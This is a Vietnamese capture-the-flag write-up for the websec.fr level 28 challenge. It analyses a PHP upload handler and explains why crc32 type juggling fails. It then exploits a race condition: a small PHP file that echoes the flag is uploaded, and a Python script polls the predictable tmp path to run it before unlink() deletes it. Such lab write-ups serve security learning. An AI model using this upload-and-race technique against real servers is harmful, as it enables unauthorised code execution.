# Đoạn code xử lý logic
```PHP
<?php
if(isset($_POST['submit'])) {
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }

  unlink($filename);
}
```

# Đoạn code xử lý nhập dữ liệu
```html
<div class='row '>
    <label for='user_id'>Please upload the <code>flag.php</code> file, and enter its checksum:</label>
    <form action='' method='post' enctype='multipart/form-data' class="form-inline">
        <div class='form-group'>
            <label class="btn btn-default">
                Select file <input type='file' name='flag_file' id='flag_file' hidden class="hidden">
            </label>
        </div>
        <div class="form-group">
            <div class="input-group">
                <div class="input-group-addon">checksum</div>
                <input type='text' name='checksum' id='checksum' class="form-control"> <br>
            </div>
        </div>
        <div class="form-group">
            <input type='submit' value='Upload and check' class="btn btn-default" name='submit'>
        </div>
    </form>
</div>
<div class='container'>
    <p class="well"><?php if (isset($flag)){ echo $flag; } else { echo 'Can you guess it?'; }?></p>
</div>
```

# Phân tích luồng hoạt động

Đoạn code bên dưới kiểm tra kích thước file, nếu lớn hơn 4096 thì sẽ dừng thực thi

```PHP
if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
```

Tiếp theo, đoạn code bên dưới sẽ tạo ra 1 tên file ngẫu nhiên dựa trên IP của người dùng, file này sẽ được lưu trong thư mục `tmp`

```PHP
$filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';
```

Tiếp theo, đoạn code bên dưới sẽ đọc nội dung của file `flag_file` và lưu vào biến `flagfilecontent`

```PHP
$fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
$flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
@fclose($fp);
```

Đoạn code bên dưới sẽ ghi nội dung của biến `flagfilecontent` vào file có tên đã tạo ở trên

```PHP
file_put_contents($filename, $flagfilecontent);
```

Tiếp theo sẽ là đoạn code xử lý condition và đây cũng là điểm lỗi mà chúng ta cần chú ý  

```PHP
if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }
```

Đoạn mã trên thực hiện việc so sánh cứng nội dung của file `flag.php` với file được upload bằng cách sử dụng hàm `md5_file`. Đồng thời nó cũng kiểm tra `checksum` được gửi lên từ người dùng.  
* Nếu đúng thì sẽ thực thi file `flag.php` và lấy giá trị của biến $flag để in ra màn hình
* Nếu sai thì sẽ in ra màn hình thông báo file không đúng và delay 1 giây  

Có 2 hướng khai thác:  
* Cố bypass để làm sao cho câu lệnh luôn đúng. Điều này chỉ xảy ra khi ta tìm được hash giống hệt md5('flag.php'), hay nói cách khác là ta phải tìm được 1 file có nội dung khác nhưng hash bằng với hash của file flag.php (hash collision) => Không thể. Về vế thứ 2 của câu lệnh điều kiện thực hiện việc so sánh `check_sum` với `crc32(checksum)`. Đây là loose comparison `==` trong PHP có thể bị type juggling. Nếu ta truyền vào checksum 1 chuỗi rỗng, khi crc32('') => 0 và 
"" là 0 nên suy ra kết quả luôn đúng. Tuy nhiên vế trái ta không có cách nào làm cho nó đúng nên câu lệnh condition nà sẽ luôn sai.
* Hướng khai thác thứ 2 là thực hiện khai thác lỗ hổng Race condition. Để ý rằng sau khi file được upload lên thì hệ thống thì file sẽ vẫn nằm ở đó và thực hiện câu lệnh điều kiện. Quan trọng hơn là nếu câu lệnh điều kiện false, file upload chưa lập tức bị xóa mà còn ngủ tròn hệ thống 1s do câu lệnh `sleep(1)` => 
Trong thời gian 1s đó, nếu chúng ta có thể thực hiện truy cập file thông qua path `./tmp/md5(ip).php` thì mã độc có thể thực thi. Nếu ta có thể thực hiện truy cập file trước khi `unlink()` được gọi thì ta có thể lấy được flag.  

# Payload exploit  
* Tôi sẽ sử dụng python để tự động hóa quy trình khai thác này  

**Để ý ở đây là, khi file flag.php được include sẽ khởi tạo 1 biến `$flag` chứa flag mà chúng ta cần tìm**

**Bước 1**: Khởi tạo file mã độc php
```PHP
<?php 
    include('../flag.php');
    echo $flag;
?>
```
**Bước 2**: Tạo payload
```python
#!/usr/bin/env python3
import requests
import time

URL = "https://websec.fr/level28/tmp/"
FILE = "md5(YOUR_IP_ADDRESS).php"

while True:
    res = requests.get(f"{URL}/{FILE}")
    if res.status_code != 404:
        print(res.text)
    else:
        print("NOPE")
    time.sleep(0.1)
```
**Có thể lấy MD5(YOUR_IP) bằng cách upload thử 1 file và đọc kết quả trả về**